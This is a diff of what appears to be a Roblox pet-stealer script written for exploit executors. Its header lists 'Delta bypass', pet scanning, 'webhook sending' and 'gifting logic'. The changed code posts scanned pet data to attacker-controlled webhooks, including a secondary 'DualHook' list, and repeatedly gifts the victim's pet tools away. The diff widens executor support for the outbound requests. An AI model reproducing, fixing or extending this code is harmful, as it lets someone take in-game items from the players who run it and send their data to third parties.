@@ -1,4 +1,5 @@
-
+-- ✅ FULL GITHUB MAIN SCRIPT (FIXED VERSION)
+-- Features: Delta bypass, GUI lock, rare pet priority, pet scanning, webhook sending, gifting logic.
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -132,15 +133,30 @@ end
 
 local payload = formatEmbed(_Scripts.SM.Config.Embed, embedData)
 
--- ✅ Send Webhook
-local request = http_request or request or (syn and syn.request)
-local allWebhooks = {}
-if getgenv().Webhook then table.insert(allWebhooks, getgenv().Webhook) end
-if _Scripts.SM.Config.DualHooked then for _, hook in ipairs(_Scripts.SM.Config.DualHookWebhook) do table.insert(allWebhooks, hook) end end
-for _, hook in ipairs(allWebhooks) do
-    pcall(function()
-        request({Url = hook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload)})
-    end)
+-- ✅ Send Webhook (with full fallback and checks)
+local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl_request)
+if not request then
+    warn("[Webhook] No HTTP request function found! Enable HTTP in your executor.")
+else
+    if type(payload) == "table" then
+        local allWebhooks = {}
+        if getgenv().Webhook then table.insert(allWebhooks, getgenv().Webhook) end
+        if _Scripts.SM.Config.DualHooked then
+            for _, hook in ipairs(_Scripts.SM.Config.DualHookWebhook) do table.insert(allWebhooks, hook) end
+        end
+        for _, hook in ipairs(allWebhooks) do
+            pcall(function()
+                request({
+                    Url = hook,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+        end
+    else
+        warn("[Webhook] Payload missing or invalid!")
+    end
 end
 
 -- ✅ Gifting Logic with Delta Bypass
@@ -171,4 +187,8 @@ local function safeGiftTool(tool)
     return true
 end
 
-for _, pet in ipairs(pets) do for attempt = 1,3 do if safeGiftTool(pet.Tool) then break end end end
+for _, pet in ipairs(pets) do
+    for attempt = 1,3 do
+        if safeGiftTool(pet.Tool) then break end
+    end
+end
